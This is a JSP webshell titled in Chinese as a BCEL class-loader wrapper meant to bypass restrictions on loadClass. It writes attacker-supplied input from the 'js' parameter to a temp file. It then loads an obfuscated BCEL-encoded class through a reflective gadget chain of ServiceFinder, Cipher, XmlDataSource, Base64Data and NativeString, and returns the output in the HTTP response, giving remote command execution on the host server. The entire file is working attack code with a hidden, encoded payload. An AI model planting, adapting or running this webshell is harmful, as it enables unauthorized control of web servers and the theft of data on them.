<%@ page import="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.lang.reflect.Array" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.security.Provider.Service" %>
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.List" %>
<%@ page import="javax.activation.DataHandler" %>
<%@ page import="javax.activation.DataSource" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.CipherInputStream" %>
<%@ page import="javax.crypto.CipherSpi" %>
<%@ page import="jdk.nashorn.internal.objects.Global" %>
<%@ page import="jdk.nashorn.internal.objects.NativeString" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Paths" %>
<html>
<body>
<h2>BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP Webshell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Files.write(Paths.get(tmp + File.separator + "CMD"), request.getParameter("js").getBytes());

    Class serviceNameClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$ServiceName");
    Constructor serviceNameConstructor = serviceNameClass.getConstructor(String.class, URL.class);
    serviceNameConstructor.setAccessible(true);
    Object serviceName = serviceNameConstructor.newInstance(new String(new byte[] {36,36,66,67,69,76,36,36,36,108,36,56,98,36,73,36,65,36,65,36,65,36,65,36,65,36,65,36,65,36,56,100,85,36,53,98,87,36,84,87,36,85,36,102,101,36,79,36,98,57,36,99,99,48,36,56,99,36,53,99,36,56,50,36,100,99,36,98,52,36,98,54,36,102,54,36,56,50,36,69,36,85,82,36,98,53,90,36,98,57,84,107,36,97,48,36,119,53,36,109,36,114,36,73,77,105,107,36,116,36,99,57,36,110,36,77,36,115,36,57,57,116,50,36,82,121,106,36,102,102,36,56,100,36,99,102,36,102,54,36,110,97,36,57,53,36,100,53,36,51,101,36,102,54,36,99,49,36,55,102,36,100,50,36,51,102,81,36,102,97,36,57,100,73,36,67,107,36,113,36,97,101,54,36,120,36,100,57,36,57,51,36,98,100,36,99,102,36,98,101,36,55,99,36,102,98,36,51,98,103,36,99,102,121,36,102,51,36,99,102,36,101,102,36,55,102,36,67,36,102,56,36,77,36,72,36,71,36,36,36,101,50,36,56,101,36,56,54,89,36,68,36,53,100,36,98,56,36,97,51,99,36,99,101,36,99,48,36,51,99,36,87,52,36,55,99,36,97,49,36,102,52,36,98,98,36,100,100,36,98,56,36,56,55,36,95,117,36,100,99,87,74,36,100,50,36,99,48,36,111,36,57,54,36,77,36,55,99,36,56,53,36,72,36,71,36,97,50,120,104,36,101,48,36,82,36,57,54,36,57,53,36,102,56,36,100,97,36,99,48,99,36,97,52,52,36,97,99,104,88,53,36,81,36,99,51,36,84,36,68,36,68,88,83,36,101,50,36,104,36,106,36,101,98,36,103,36,100,50,36,71,70,36,98,48,97,36,101,48,36,118,54,53,108,105,36,102,56,86,36,109,36,98,97,36,54,48,36,57,55,109,36,101,102,36,97,101,36,52,48,36,117,36,51,101,36,98,57,36,118,36,81,36,53,101,116,36,102,50,82,36,97,48,36,95,101,36,57,55,36,101,53,106,36,97,100,36,57,52,36,57,53,36,101,101,36,56,54,36,57,53,36,122,36,100,50,36,83,75,57,57,36,97,98,36,98,56,105,36,98,57,36,98,54,36,100,50,36,53,98,36,99,54,36,98,48,36,98,55,107,87,36,57,53,36,102,55,36,99,54,36,97,101,36,120,101,36,100,101,36,98,100,105,36,57,53,36,57,101,36,53,100,36,98,102,53,36,95,36,97,48,36,95,36,101,52,36,56,97,36,101,100,36,98,99,36,53,101,36,97,57,36,97,50,36,99,50,36,102,55,36,97,99,36,88,86,36,97,50,104,36,57,53,36,76,36,56,57,36,98,52,36,101,55,36,100,97,36,101,53,36,67,36,98,100,66,36,98,57,82,36,53,101,36,97,48,36,99,55,36,36,87,106,36,107,36,56,100,36,100,50,36,119,36,74,36,77,53,36,106,109,36,116,36,98,49,36,55,99,106,36,97,54,111,111,36,98,54,36,98,54,36,98,51,36,112,36,53,100,36,57,57,95,36,57,55,86,36,53,101,36,98,97,36,67,36,97,51,36,116,36,56,101,36,99,57,36,99,48,36,75,36,55,100,36,99,51,36,97,99,77,116,66,36,57,101,36,97,52,36,102,51,36,101,98,36,83,36,97,52,36,98,51,36,97,102,36,56,48,36,100,51,36,101,53,36,53,99,36,100,53,36,72,36,57,49,36,97,99,36,100,57,69,36,51,102,36,100,98,36,100,56,36,90,36,55,99,36,97,100,36,114,36,101,53,36,57,98,36,102,54,36,97,99,36,100,99,36,102,51,36,86,36,97,98,36,101,50,119,36,99,100,36,78,36,101,50,36,57,101,104,36,99,56,36,102,56,52,36,97,55,36,70,36,56,99,36,98,52,83,115,115,36,102,50,36,56,49,36,101,100,36,100,51,36,85,36,54,48,98,70,36,114,53,36,102,49,36,107,36,36,36,74,36,56,99,36,98,99,36,97,51,36,65,36,53,98,83,36,120,51,36,98,54,51,67,36,97,54,36,102,50,36,98,54,36,97,98,36,101,49,36,51,98,36,84,36,100,98,36,102,56,36,53,101,36,97,48,36,102,102,36,101,100,36,81,36,84,36,51,102,36,101,48,71,36,78,36,99,102,76,36,102,99,36,56,52,113,36,102,50,36,98,55,36,98,56,36,98,50,100,36,99,50,66,86,67,36,99,101,68,36,107,36,99,52,36,98,54,99,36,97,50,36,56,48,36,53,100,85,36,100,50,36,100,54,36,98,48,103,36,101,50,57,36,56,97,36,115,74,36,117,107,112,76,84,36,102,48,36,98,51,36,99,48,112,103,36,100,97,72,65,36,72,36,101,50,36,57,98,107,36,119,36,57,100,36,95,36,97,97,36,115,36,51,99,100,36,99,57,36,97,99,36,110,48,36,100,56,36,56,49,88,36,84,53,36,53,99,36,100,50,36,102,48,36,99,50,36,99,52,36,51,101,36,53,101,36,57,50,36,98,56,36,65,36,90,36,56,49,36,55,101,36,57,101,100,36,102,55,100,36,99,101,107,103,36,74,36,87,36,78,54,36,55,101,80,36,102,53,36,113,77,36,51,100,36,70,36,101,57,36,97,100,36,98,57,78,69,36,98,97,36,100,101,36,56,49,36,99,48,36,57,53,36,102,56,36,100,57,36,102,51,52,36,100,57,36,101,57,36,56,56,69,36,97,100,74,69,36,57,54,121,36,99,97,36,97,54,36,102,102,87,36,99,52,36,101,57,36,97,54,36,57,98,109,36,54,48,36,99,100,36,55,100,36,101,100,36,97,101,36,99,97,36,56,97,36,101,53,90,36,57,101,67,36,97,50,116,36,99,102,105,122,36,76,36,57,99,36,56,102,119,36,97,99,36,100,97,36,101,99,36,97,97,36,99,99,36,101,56,36,106,70,36,116,36,100,54,36,121,111,36,57,55,99,36,83,98,36,76,36,67,36,102,51,36,106,36,56,48,108,36,98,102,36,84,36,53,98,36,109,36,99,55,36,100,57,36,99,99,36,75,36,105,51,36,57,98,36,97,52,36,122,36,55,102,36,98,102,88,76,36,107,120,74,36,106,36,56,100,119,36,75,36,57,101,36,100,99,78,36,75,68,36,101,50,36,100,98,73,53,36,101,55,36,68,36,97,55,36,70,36,100,55,107,101,36,99,102,36,36,36,98,49,71,36,56,51,36,102,56,78,36,57,52,36,97,49,36,52,48,103,36,122,36,98,51,36,57,97,36,122,36,102,57,82,36,101,54,36,69,36,115,36,102,101,36,56,51,78,110,85,78,86,36,97,98,36,102,51,36,56,49,74,36,122,36,112,79,36,51,99,36,120,36,70,54,36,55,99,36,97,52,36,53,100,36,101,100,36,99,99,36,100,99,36,98,55,36,55,98,121,107,65,36,102,53,48,120,36,98,97,36,100,52,36,103,36,55,100,101,36,100,53,36,86,36,88,36,118,36,102,102,36,70,36,100,48,87,36,110,36,36,36,99,102,36,57,102,36,100,101,36,78,36,100,55,36,99,97,36,99,57,36,65,36,57,56,36,101,53,36,98,50,36,116,36,76,36,101,97,36,100,99,36,101,98,36,100,99,36,100,56,36,97,97,36,97,52,36,97,97,36,57,97,36,101,101,36,100,48,36,100,53,50,36,51,101,36,99,52,36,70,36,98,101,36,57,97,36,100,53,36,97,55,36,76,66,77,51,36,101,53,36,102,98,36,100,52,36,83,36,55,99,36,75,36,51,101,36,112,83,36,78,36,56,56,36,100,55,36,102,101,36,102,50,36,72,36,57,52,81,36,100,102,36,100,56,36,56,51,36,99,98,36,57,52,102,36,100,51,36,56,49,36,118,36,51,101,36,101,50,83,36,99,55,36,99,55,36,101,100,36,54,48,36,102,49,36,57,48,36,100,54,36,117,109,36,98,102,36,107,36,97,49,36,120,36,100,51,36,52,48,36,101,56,113,36,121,36,55,99,36,56,56,72,36,101,97,36,73,36,100,49,76,36,99,98,114,36,98,53,36,79,36,101,100,55,36,101,56,36,57,52,36,98,49,110,36,56,97,36,51,97,36,56,99,36,100,48,36,108,36,56,56,36,107,36,97,50,36,101,55,36,81,102,36,68,36,101,55,86,36,79,36,100,49,36,55,98,36,97,100,36,56,101,36,98,101,36,51,97,36,102,97,87,36,56,102,48,36,99,48,36,97,56,88,102,36,98,97,36,56,49,36,99,49,36,71,36,99,101,36,99,102,36,56,53,36,99,55,36,99,50,117,36,77,101,36,101,54,36,111,36,55,102,36,110,54,53,36,87,81,36,118,36,56,54,36,118,36,98,54,36,53,101,36,106,36,102,102,36,102,100,36,75,122,36,56,97,36,57,57,71,36,97,55,36,57,56,36,101,102,36,81,99,36,53,98,36,97,102,36,56,57,71,36,56,55,36,68,36,57,55,87,67,36,99,56,36,99,55,36,55,102,36,56,51,36,97,56,36,56,49,36,53,101,90,36,102,98,36,118,36,72,48,36,99,98,36,57,98,100,36,74,36,56,51,36,98,99,53,36,56,54,36,102,56,36,100,101,36,90,36,97,54,36,101,102,36,70,122,36,56,102,36,97,50,36,56,97,49,36,99,101,36,102,57,69,36,102,99,66,74,84,36,97,102,36,56,102,36,97,48,36,100,49,36,100,102,36,99,50,36,116,36,89,103,36,99,101,89,36,100,99,36,99,54,36,86,36,102,101,36,101,98,98,36,101,99,85,76,36,109,36,99,101,36,101,99,79,36,90,57,36,56,57,36,118,36,56,52,36,102,57,36,107,36,56,98,36,100,49,36,51,97,78,36,79,36,97,97,36,100,52,36,97,101,97,36,100,97,71,36,98,49,36,56,102,36,90,36,57,50,36,75,36,55,99,36,99,97,36,100,102,36,69,36,99,50,36,99,55,36,77,36,56,56,104,36,98,56,36,97,101,36,101,49,36,56,54,36,102,102,36,98,100,36,97,57,36,102,49,36,57,97,36,99,52,49,36,99,98,36,75,90,36,56,49,36,97,52,36,56,54,36,53,98,97,36,71,36,100,101,36,102,54,36,97,57,36,102,102,36,102,99,95,36,98,53,36,51,100,36,102,101,36,116,74,36,72,36,65,36,65}), null);
    Object serviceNameArray = Array.newInstance(serviceNameClass, 1);
    Array.set(serviceNameArray, 0, serviceName);

    Class lazyIteratorClass = Class
            .forName("com.sun.xml.internal.ws.util.ServiceFinder$LazyIterator");
    Constructor lazyIteratorConstructor = lazyIteratorClass.getDeclaredConstructors()[1];
    lazyIteratorConstructor.setAccessible(true);
    Object lazyIterator = lazyIteratorConstructor.newInstance(String.class, new ClassLoader());
    Field namesField = lazyIteratorClass.getDeclaredField("names");
    namesField.setAccessible(true);
    namesField.set(lazyIterator, serviceNameArray);

    Constructor cipherConstructor = Cipher.class
            .getDeclaredConstructor(CipherSpi.class, Service.class, Iterator.class, String.class,
                    List.class);
    cipherConstructor.setAccessible(true);
    Cipher cipher = (Cipher) cipherConstructor.newInstance(null, null, lazyIterator, null, null);
    Field opmodeField = Cipher.class.getDeclaredField("opmode");
    opmodeField.setAccessible(true);
    opmodeField.set(cipher, 1);
    Field initializedField = Cipher.class.getDeclaredField("initialized");
    initializedField.setAccessible(true);
    initializedField.set(cipher, true);
    CipherInputStream cipherInputStream = new CipherInputStream(
            new ByteArrayInputStream(new byte[0]), cipher);

    Class xmlDataSourceClass = Class
            .forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
    Constructor xmlDataSourceConstructor = xmlDataSourceClass.getDeclaredConstructors()[0];
    xmlDataSourceConstructor.setAccessible(true);
    DataSource xmlDataSource = (DataSource) xmlDataSourceConstructor
            .newInstance("", cipherInputStream);
    DataHandler dataHandler = new DataHandler(xmlDataSource);
    Base64Data base64Data = new Base64Data();
    Field dataHandlerField = Base64Data.class.getDeclaredField("dataHandler");
    dataHandlerField.setAccessible(true);
    dataHandlerField.set(base64Data, dataHandler);
    Constructor NativeStringConstructor = NativeString.class
            .getDeclaredConstructor(CharSequence.class, Global.class);
    NativeStringConstructor.setAccessible(true);
    NativeString nativeString = (NativeString) NativeStringConstructor
            .newInstance(base64Data, new Global(new Context(new Options(""), null, null)));

    try {
        new HashMap<>().put(nativeString, "111");
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>